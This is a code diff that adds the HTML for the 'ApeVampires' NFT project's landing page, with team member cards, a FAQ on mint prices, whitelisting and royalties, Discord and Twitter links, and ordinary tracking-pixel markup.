+                                        <div class="avatar_hover">Spliff22 has a background in marketing successful nft collections. His passion for crypto led him to NFTs. Using his knowledge bringing creative ideas to reality.</div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Spliff22</div>
+                                            <div class="name_description">Co-founder &amp; Head of Marketing</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slider__item slider__item_active" data-index="2" data-order="2" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar"><img src="3.webp">
+                                        <div class="avatar_hover">Innovative technology enthusiast with strong software development and project management background, currently working for one of the companies leading the digital evolution.</div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Jimi</div>
+                                            <div class="name_description">Developer</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slider__item slider__item_active" data-index="3" data-order="3" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar"><img src="4.webp">
+                                        <div class="avatar_hover">Merlin uses vibrant colors and textures to make
+                                            digital pieces that are fun, exaggerated, and upbeat. She woke up one
+                                            day with an ape on her head and a burning desire to make 6,666
+                                            ApeVampires. What was life before the ape? There was no life before the
+                                            ape.</div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Merlin Floride</div>
+                                            <div class="name_description">Graphic Designer &amp; NFT Specialist</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slider__item" data-index="4" data-order="4" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar"><img src="5.webp">
+                                        <div class="avatar_hover"></div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Danny</div>
+                                            <div class="name_description">Community Manager</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slider__item" data-index="5" data-order="5" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar"><img src="6.webp">
+                                        <div class="avatar_hover"></div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Elevan</div>
+                                            <div class="name_description">Community Manager</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <a href="#" class="slider__control left slider__control_hide" data-slide="prev"></a>
+                <a href="#" class="slider__control" data-slide="next"></a>
+            </div>
+
+        </div>
+    </div>
+</div>    
+    
+    <div class="container-fluid second-screen_over">
+        
+    <img class="fog6" src="token_img.webp">
+    <div class="container-xl pos_rel_z">
+        <div class="row padding-top2 justify-content-center">
+            <div class="col-12">
+                <div class="h2">READY TO JOIN?</div>
+            </div>
+            <!--
+            <div class="span_description pt-5 text-center">
+                Ape NFT projects have amazing ROI, just check out OpenSea<BR>
+                We have a unique vision and art, we are not just another copy project<BR>
+                Vampire culture is widely accepted among young generation<BR>
+                We are first big NFT project using Vampires in art concept<BR>
+                NFT holders of this project will get tokens dropped for free in upcoming months<BR>
+                ApeVampires will go to Metaverse and even have own game!<BR>
+                There are no secondary royalty fees
+            </div>
+            -->
+        </div>
+    </div>            <div class="col-12 d-flex" style="justify-content: center; margin-top: 50px;">
+                                    <a class="main_btn" target="_blank" href="https://discord.gg/4WMssy2AUm">Join Discord</a>
+                            </div>
+        <div class="container-xl pos_rel_z">
+    <div class="row padding-top2 justify-content-center">
+        <div class="col-12">
+            <a href="#" class="h2" name="faq">Faq</a>
+        </div>
+        <div class="col-12 col-sm-10" style="margin-top: 50px;">
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">How much does ApeVampire NFT minting cost?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">For the Early Bird and presale the price will be 0,05 ETH + gas price and you will be able to mint a max of 2 Apes. For the Public Sale the price will be 0,07 ETH + gas price and you will be able to mint a max of 20 Apes.</div>
+                    </div>
+                </div>
+            </div>
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">Where can I see my NFT?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">Once the Public Sale is completed, you will be able to see your ApeVampire on your OpenSea profile by simply connecting your wallet to the OpenSea website. The reveal will happen 1 week after the public sale.</div>
+                    </div>
+                </div>
+            </div>
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">When will I be able to mint an ApeVampires NFT?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">Public Sale date is gonna be announced on our Twitter profile and Discord server.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">How do I get whitelisted?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">There is no need for WL. Public sale works on first come first serve basis. Everyone has a chance to mint.</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">Why do I have to own a NFT?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">NFTs will be your pass for the membership to the most Exclusive Club in the Crypto space. You will enjoy privileges, private events, be a share owner of ApeVampires land in metaverse space and private parties. Furthermore, if you’ll be lucky enough, you will get the chance to go to the moon with other business rich men that can afford a 150k ticket to get the one lifetime experience and see the earth from space!</div>
+                    </div>
+                </div>
+            </div>
+
+
+
+            <div class="container_tab">
+                <div class="container_top_border">
+                    <div class="container_top">
+                        <div class="body_text_top">Are there secondary royalty fees?</div>
+                        <div class="body_container_right_top">
+                            <div class="body_right_top">
+                                <svg width="18" height="10" viewBox="0 0 18 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M0.515015 1.46495L9.00001 9.94995L17.485 1.46495L16.071 0.0499516L9.00001 7.12195L1.92901 0.0499516L0.515015 1.46495Z" fill="white"></path>
+                                </svg>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container_bottom_border">
+                    <div class="container_bottom">
+                        <div class="body_text_bottom">No, there are no secondary royalty fees.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+        <div class="container-xl">
+    <div class="row footer_container">
+        <div class="col-12 col-sm-6 txt_footer">© 2021 ApeVampires. All rights reserved.</div>
+        <div class="col-12 col-sm-6 col_soc_icon">
+            <div class="soc_icon"><a href="mailto:info@apevampires.com"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 0H2C0.9 0 0.00999999 0.9 0.00999999 2L0 14C0 15.1 0.9 16 2 16H18C19.1 16 20 15.1 20 14V2C20 0.9 19.1 0 18 0ZM18 4L10 9L2 4V2L10 7L18 2V4Z" fill="url(#paint0_linear_68_187)"></path>
+                    <defs>
+                    <linearGradient id="paint0_linear_68_187" x1="10" y1="0" x2="10" y2="16" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#A0F4FF"></stop>
+                    <stop offset="1" stop-color="#1170DF"></stop>
+                    </linearGradient>
+                    </defs>
+                    </svg> </a></div>
+            <div class="soc_icon"><a href="https://twitter.com/ApeVampires"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19.6 1.89999C18.9 2.19999 18.1 2.4 17.3 2.5C18.1 2 18.8 1.2 19.1 0.300003C18.3 0.800003 17.5 1.1 16.5 1.3C15.8 0.500003 14.7 0 13.6 0C11.4 0 9.59999 1.8 9.59999 4C9.59999 4.3 9.6 4.59999 9.7 4.89999C6.4 4.69999 3.39999 3.1 1.39999 0.699997C1.09999 1.3 0.899994 2 0.899994 2.7C0.899994 4.1 1.6 5.3 2.7 6C2 6 1.39999 5.8 0.899994 5.5C0.899994 7.4 2.29999 9.09999 4.09999 9.39999C3.79999 9.49999 3.4 9.5 3 9.5C2.7 9.5 2.5 9.49999 2.2 9.39999C2.7 11 4.2 12.2 6 12.2C4.6 13.3 2.9 13.9 1 13.9C0.7 13.9 0.4 13.9 0 13.8C1.8 14.9 3.9 15.6 6.2 15.6C13.6 15.6 17.6 9.5 17.6 4.2V3.7C18.4 3.4 19.1 2.69999 19.6 1.89999Z" fill="url(#paint0_linear_3_549)"></path>
+                        <defs>
+                            <linearGradient id="paint0_linear_3_549" x1="9.8" y1="0" x2="9.8" y2="15.6" gradientUnits="userSpaceOnUse">
+                                <stop stop-color="#A0F4FF"></stop>
+                                <stop offset="1" stop-color="#1170DF"></stop>
+                            </linearGradient>
+                        </defs>
+                    </svg> </a></div>
+            <div class="soc_icon"><a href="https://discord.gg/4WMssy2AUm"><svg width="18" height="20" viewBox="0 0 18 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M15.8914 0H2.10857C0.946286 0 0 0.92 0 2.06V15.58C0 16.72 0.946286 17.64 2.10857 17.64H13.7726L13.2274 15.79L14.544 16.98L15.7886 18.1L18 20V2.06C18 0.92 17.0537 0 15.8914 0ZM11.9211 13.06C11.9211 13.06 11.5509 12.63 11.2423 12.25C12.5897 11.88 13.104 11.06 13.104 11.06C12.6823 11.33 12.2811 11.52 11.9211 11.65C11.4069 11.86 10.9131 12 10.4297 12.08C9.44229 12.26 8.53714 12.21 7.76571 12.07C7.17943 11.96 6.67543 11.8 6.25371 11.64C6.01714 11.55 5.76 11.44 5.50286 11.3C5.472 11.28 5.44114 11.27 5.41029 11.25C5.38971 11.24 5.37943 11.23 5.36914 11.22C5.184 11.12 5.08114 11.05 5.08114 11.05C5.08114 11.05 5.57486 11.85 6.88114 12.23C6.57257 12.61 6.192 13.06 6.192 13.06C3.91886 12.99 3.05486 11.54 3.05486 11.54C3.05486 8.32 4.536 5.71 4.536 5.71C6.01714 4.63 7.42629 4.66 7.42629 4.66L7.52914 4.78C5.67771 5.3 4.824 6.09 4.824 6.09C4.824 6.09 5.05029 5.97 5.43086 5.8C6.53143 5.33 7.40571 5.2 7.76571 5.17C7.82743 5.16 7.87886 5.15 7.94057 5.15C8.568 5.07 9.27771 5.05 10.0183 5.13C10.9954 5.24 12.0446 5.52 13.1143 6.09C13.1143 6.09 12.3017 5.34 10.5531 4.82L10.6971 4.66C10.6971 4.66 12.1063 4.63 13.5874 5.71C13.5874 5.71 15.0686 8.32 15.0686 11.54C15.0686 11.54 14.1943 12.99 11.9211 13.06ZM7.13829 8.39C6.552 8.39 6.08914 8.89 6.08914 9.5C6.08914 10.11 6.56229 10.61 7.13829 10.61C7.72457 10.61 8.18743 10.11 8.18743 9.5C8.19771 8.89 7.72457 8.39 7.13829 8.39ZM10.8926 8.39C10.3063 8.39 9.84343 8.89 9.84343 9.5C9.84343 10.11 10.3166 10.61 10.8926 10.61C11.4789 10.61 11.9417 10.11 11.9417 9.5C11.9417 8.89 11.4789 8.39 10.8926 8.39Z" fill="url(#paint0_linear_2_97)"></path>
+                        <defs>
+                            <linearGradient id="paint0_linear_2_97" x1="9" y1="0" x2="9" y2="20" gradientUnits="userSpaceOnUse">
+                                <stop stop-color="#A0F4FF"></stop>
+                                <stop offset="1" stop-color="#1170DF"></stop>
+                            </linearGradient>
+                        </defs>
+                    </svg></a></div>
+        </div>
+    </div>
+</div>
+        
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+<noscript><img height="1" width="1" style="display:none" src="tr.gif"></noscript>
+<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon5174830419"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon925935592289" width="0" height="0" alt="" src="0"></div></body></html>
